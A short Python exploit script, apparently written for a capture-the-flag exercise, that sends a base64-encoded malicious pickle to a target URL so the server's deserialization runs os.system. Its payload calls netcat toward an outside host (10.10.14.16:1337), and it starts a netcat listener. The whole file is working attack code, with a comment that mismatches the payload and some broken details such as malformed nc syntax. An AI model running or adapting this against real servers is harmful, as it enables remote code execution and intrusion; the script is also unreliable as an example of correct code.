import sys
import base64
import pickle
import os
import requests

# Payload to be executed (copying flag.txt to application/static/)
payload = "nc -v 10.10.14.16:1337"

# Exploit class definition
class Exploit:

    # __reduce__ method for serialization and deserialization
    def __reduce__(self):
        return os.system, (payload,)

def listener_task():
    # Start a listener using nc -lvnp 1337
    os.system("nc -lvnp 1337")

def exploit(url):
    # Create an instance of the Exploit class
    exploit_instance = Exploit()

    # Serialize the object using pickle and encode in base64
    serialized_payload = base64.b64encode(pickle.dumps(exploit_instance)).decode()

    # Construct the final URL by appending the serialized payload
    final_url = f"{url}/{serialized_payload}"

    # Perform a GET request to the constructed URL
    response = requests.get(final_url)
    print("GET Request Response:")
    print(response.text)

if __name__ == "__main__":
    # Example usage
    target_url = "https://example.com"  # Replace with the actual target URL

    listener_task()

	exploit(target_url)
